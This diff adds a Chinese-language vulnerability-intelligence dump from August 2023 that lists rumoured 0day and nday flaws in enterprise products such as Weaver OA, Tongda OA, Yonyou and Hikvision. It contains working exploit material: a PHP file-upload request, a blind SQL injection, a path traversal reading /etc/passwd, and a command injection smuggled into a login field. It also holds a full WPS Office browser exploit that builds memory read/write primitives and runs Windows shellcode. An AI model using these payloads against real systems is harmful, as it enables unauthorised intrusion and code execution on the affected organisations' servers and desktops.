@@ -1,0 +1,461 @@
+8月8日第一批情报
+传闻下述系统/产品存在0DAY请联系供应商自查。
+深信服应用交付系统命令执行
+协同办公文档(DzzOfffice)未授权访问
+泛微OA前台代码执行漏洞
+电子签章平台代码执行漏洞
+泛微oa进后台漏洞
+ucloud的未授权获取任意用户cookie
+飞书客户端RCE漏洞
+海康威视综合安防平台
+泛微EofficeV10前台RCE
+来客推商城任意文件上传
+天明堡垒机Oday
+明御运维审计与风险控制系统堡垒机任意用户注册
+协同管理系统存在SQL注入
+泛微emobile注入漏洞
+亿赛通-任意文件上传
+泛微e-mobile-文件上传
+红帆oa-前台文件上传
+泛微eclogy-sql注入
+大华车载监控-任意密码重置
+高新能接入集群管理平台任意文件上传
+讯绕x2Modbus协议转换网关-任意用户修改
+用友-时空KSOA-任意文件读取漏洞
+用友nc-cloud-任意文件写入
+
+8月9日第一批情报
+2023 漏洞预警-V003-亿赛通电子文档平台文件上传漏洞
+1、漏洞信息
+漏洞名称 亿赛通电子文档平台文件上传漏洞
+影响产品 亿赛通电子文档平台
+漏洞描述 亿赛通电子文档安全管理系统任意文件上传漏洞，攻击者可通过发送特制请求来
+利用此漏洞，成功利用此漏洞可在目标系统上执行任意代码
+漏洞类型 文件上传
+影响版本 不明
+漏洞状态 未公开 POC，未发布补丁，0day
+2、研判结果
+厂商未公开 POC，未发布补丁，阿里长亭团队已复现，确认该漏洞存在。
+3、修复建议
+目前亿某通官方未发布安全版本或补丁修复这些漏洞，建议受影响用户针对以下路径进行访问策略限
+制。
+/CDGServer3/UploadFileFromClientServiceForClient
+/CDGServer3/UsersService
+
+8月10日第一批情报
+泛微 OA 代码执行 EXP
+
+描述和影响范围
+Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件/inc/jquery/uploadify/uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。
+
+Weaver E-Office9.0
+
+POC or EXP
+
+
+
+POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+Host: 192.168.232.137:8082
+User-Agent: test
+Connection: close
+Content-Length: 493
+Accept-Encoding: gzip
+Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+Content-Disposition: form-data; name="Filedata"; filename="666.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+
+--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
+
+
+
+Exchange Server远程代码执行漏洞（CVE-2023-38182）风险通告 待补充poc exp
+描述和影响范围
+Exchange Server 2019 Cumulative Update 13
+
+Exchange Server 2019 Cumulative Update 12
+
+Exchange Server 2019 Cumulative Update 11
+
+Exchange Server 2016 Cumulative Update 23
+
+需要有普通用户权限
+
+
+通达OA（CVE-2023-4166）
+描述-影响范围
+通达OA
+
+是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台
+
+本次范围：通达OA版本11.10之前
+
+POC 
+post请求包
+
+
+
+GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
+Host: 192.168.232.137:8098
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46
+Upgrade-Insecure-Requests: 1
+
+
+
+泛微 Weaver E-Office9 前台文件包含
+POC
+
+
+http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls
+
+
+
+金山WPS RCE 
+wps影响范围为：WPS Office 2023 个人版 < 11.1.0.15120
+
+WPS Office 2019 企业版 < 11.8.2.12085
+
+POC
+在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的） 
+
+
+
+127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn
+
+
+
+漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn cloudwps.cn和wps.cn没有任何关系
+
+代码块在底下。（需要原pdf加wechat）
+
+
+
+<script>
+if(typeof alert === "undefined"){
+alert = console.log;
+}
+let f64 = new Float64Array(1);
+let u32 = new Uint32Array(f64.buffer);
+function d2u(v) {
+f64[0] = v;
+return u32;
+}
+function u2d(lo, hi) {
+u32[0] = lo;
+u32[1] = hi;
+return f64[0];
+}
+function gc(){ // major
+for (let i = 0; i < 0x10; i++) {
+new Array(0x100000);
+}
+}
+function foo(bug) {
+function C(z) {
+Error.prepareStackTrace = function(t, B) {
+return B[z].getThis();
+};
+let p = Error().stack;
+Error.prepareStackTrace = null;
+return p;
+}
+function J() {}
+var optim = false;
+var opt = new Function(
+'a', 'b', 'c',
+'if(typeof a===\'number\'){if(a>2){for(var
+i=0;i<100;i++);return;}b.d(a,b,1);return}' +
+'g++;'.repeat(70));
+var e = null;
+J.prototype.d = new Function(
+'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');
+J.prototype.a = new Function('a', 'a.b(0,a)');
+J.prototype.b = new Function(
+'a', 'b',
+'b.c();if(a){' +
+'g++;'.repeat(70) + '}');
+J.prototype.c = function() {
+if (optim) {
+var z = C(3);
+var p = C(3);
+z[0] = 0;
+e = {M: z, C: p};
+}
+};
+var a = new J();
+// jit optim
+if (bug) {
+for (var V = 0; 1E4 > V; V++) {
+opt(0 == V % 4 ? 1 : 4, a, 1);
+}
+}
+optim = true;
+opt(1, a, 1);
+return e;
+}
+e1 = foo(false);
+e2 = foo(true);
+delete e2.M[0];
+let hole = e2.C[0];
+let map = new Map();
+map.set('asd', 8);
+map.set(hole, 0x8);
+map.delete(hole);
+map.delete(hole);
+map.delete("asd");
+map.set(0x20, "aaaa");
+let arr3 = new Array(0);
+let arr4 = new Array(0);
+let arr5 = new Array(1);
+let oob_array = [];
+oob_array.push(1.1);
+map.set("1", -1);
+let obj_array = {
+m: 1337, target: gc
+};
+let ab = new ArrayBuffer(1337);
+let object_idx = undefined;
+let object_idx_flag = undefined;
+let max_size = 0x1000;
+for (let i = 0; i < max_size; i++) {
+if (d2u(oob_array[i])[0] === 0xa72) {
+object_idx = i;
+object_idx_flag = 1;
+break;
+}if (d2u(oob_array[i])[1] === 0xa72) {
+object_idx = i + 1;
+object_idx_flag = 0;
+break;
+}
+}
+function addrof(obj_para) {
+obj_array.target = obj_para;
+let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;
+obj_array.target = gc;
+return addr;
+}
+function fakeobj(addr) {
+let r8 = d2u(oob_array[object_idx]);
+if (object_idx_flag === 0) {
+oob_array[object_idx] = u2d(addr, r8[1]);
+}else {
+oob_array[object_idx] = u2d(r8[0], addr);
+}
+return obj_array.target;
+}
+let bk_idx = undefined;
+let bk_idx_flag = undefined;
+for (let i = 0; i < max_size; i++) {
+if (d2u(oob_array[i])[0] === 1337) {
+bk_idx = i;
+bk_idx_flag = 1;
+break;
+}if (d2u(oob_array[i])[1] === 1337) {
+bk_idx = i + 1;
+bk_idx_flag = 0;
+break;
+}
+}
+let dv = new DataView(ab);
+function get_32(addr) {
+let r8 = d2u(oob_array[bk_idx]);
+if (bk_idx_flag === 0) {
+oob_array[bk_idx] = u2d(addr, r8[1]);
+} else {
+oob_array[bk_idx] = u2d(r8[0], addr);
+}
+let val = dv.getUint32(0, true);
+oob_array[bk_idx] = u2d(r8[0], r8[1]);
+return val;
+}
+function set_32(addr, val) {
+let r8 = d2u(oob_array[bk_idx]);
+if (bk_idx_flag === 0) {
+oob_array[bk_idx] = u2d(addr, r8[1]);
+} else {
+oob_array[bk_idx] = u2d(r8[0], addr);
+}
+dv.setUint32(0, val, true);
+oob_array[bk_idx] = u2d(r8[0], r8[1]);
+}
+function write8(addr, val) {
+let r8 = d2u(oob_array[bk_idx]);
+if (bk_idx_flag === 0) {
+oob_array[bk_idx] = u2d(addr, r8[1]);
+} else {
+oob_array[bk_idx] = u2d(r8[0], addr);
+}
+dv.setUint8(0, val);
+}
+let fake_length = get_32(addrof(oob_array)+12);
+set_32(get_32(addrof(oob_array)+8)+4,fake_length);
+let wasm_code = new
+Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,
+128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,
+128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0
+,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+let wasm_mod = new WebAssembly.Module(wasm_code);
+let wasm_instance = new WebAssembly.Instance(wasm_mod);
+let f = wasm_instance.exports.main;
+let target_addr = addrof(wasm_instance)+0x40;
+let rwx_mem = get_32(target_addr);
+//alert("rwx_mem is"+rwx_mem.toString(16));
+const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,
+0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,
+0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,
+0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,
+0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,
+0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
+0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
+0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,
+0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,
+0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,
+0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,
+0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,
+0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,
+0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
+0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,
+0x00]);
+for(let i=0;i<shellcode.length;i++){
+write8(rwx_mem+i,shellcode[i]);
+}
+f();
+</script>
+
+
+
+
+ 绿盟sas安全审计系统任意文件读取漏洞
+POC
+/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd
+
+ sxf-报表 版本有限制 
+POC
+
+
+POST /rep/login HTTP/1.1 Host: Cookie: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
+Accept-Encoding: gzip deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers Connection: close Content-Type:application/x-www-form-urlencoded Content-Length: 126 clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
+
+
+
+
+nday消息同步
+
+1海康威视综合安防前台文件上传漏洞
+
+这个洞厂商修复有些问题，还是可以通过...跳转到根目录，换个接口而已
+
+2.蓝凌OA前台代码执行漏洞
+
+蓝凌V131415就不说了，去年代码执行、金格接口打得很凶，今年蓝凌有了大更新之后还是存在很多RCE问题
+
+3.致远M3Server-xxxx反序列化漏洞
+
+懂得都懂
+
+4.致远A8V8SP1SP2文件上传漏洞(1dav)
+
+1day，今年年初修复了很多，ajaxdo接口ajaxAction涉及的文件操作方法还是很多的
+
+5.普元EOS
+
+前台代码执行漏洞，这系统代码执行也太多了不赘述，建议重开6泛微F-coloav后合文件上传漏洞(0dav
+
+从数据库读xxx，然后写到根目录，除了一些流
+
+传的1day之外泛微可以说基本已安全，RASP能
+
+绕也不想耗费精力继续看了，这个洞是针对去年
+
+的前台洞绕过。
+
+7泛微E-Mobile任意用户登录(1day)
+
+Emobile很难做后续利用，不过如果存在信息泄露风险的可以关注下8泛微E-Office10信息泄露后台+后台文件上传漏洞(Oday)很牛的组合漏洞，office9洞太多用的少没必要写了
+
+9契约锁电子签章系统RCE(1day)
+
+上海某行动期间已修复，更新补丁很快，这家签章平台响应速度还是很快的，和泛微ECO经常同框打包卖
+
+10.亿赛通电子文档平台文件上传漏洞市面上的上传1day其实去年补丁都打完了，今年有新的，可以注意下
+
+11.ldocview命令执行漏洞
+
+去年项目挖的，今年还在12jeesite代码执行漏洞Oday，丁真来了都得说真13LiveBOS文件上传漏洞
+
+金融单位供应链，不需要前几年的跳目录了，新
+
+版本灵动框架的上传绕过绕的很emmm
+
+14.用友nc-cloud-任意文件写入(Oday
+
+NCCLOUD今年用过大部分都没修
+
+15.一哥VPN
+
+预计今年二进制漏洞打得也会很凶，端口PWN!
+
+16.xxIOA PWN
+
+零信任不一定真的安全
+
+17.xxx准入PWN
+
+弱口令记得也要修一修
+
+18.深信服应用交付系统命令执行
+
+19.协同办公文档(DzzOfffice)未授权访问
+
+20.电子签章平台代码执行漏洞
+
+21泛微oa进后台漏洞
+
+22.ucloud的未授权获取任意用户cookie
+
+23.飞书客户端RCE漏洞
+
+24.泛微EofficeV10前台RCE
+
+25.来客推商城任意文件上传
+
+26天明堡垒机Oday
+
+27明御运维审计与风险控制系统堡垒机任意用户注册28协同管理系统存在SQL注入29泛微emobile注入漏洞
+
+30.拓尔思WCM任意命令执行漏洞
+
+31.用友财务云任意文件上传漏洞
+
+第二波
+Hillstone LMS 系统命令执行漏洞
+天翼云网页防篡改系统命令执行漏洞
+致远 OA 系统命令执行漏洞
+致远0A 系统 V5-V6 模块命令执行漏洞
+山石网科 BDR 系统 PHP 模块命令执行漏洞
+H3C NX54 系统 web 模块信息泄露漏洞
+镜捷 BG 易网关系统 patch. php 模块命令执行漏洞
+H3C 虚拟授权管理系统系统 queryip模块命令执行漏洞
+H3C 虚拟授权管理系统系统 web 模块命令执行漏洞
+H3C综合日志审计平台系统webservice 模块命令执行漏洞
+Logbase 堡垒机系统web 模块 SQL 注入漏洞
+锐捷EG 易网关系统命令执行漏洞
+锐捷 RG-UAC-6000-ISG 系统命令执行漏洞
+锐捷云办公主机系统鉴权绕过模块命令执行漏洞
+达云一卡通系统文件上传漏洞
+
+
+华三超融合存在0day，浪潮交易平台存在越权，具体内容晚上发布，已经证实存在
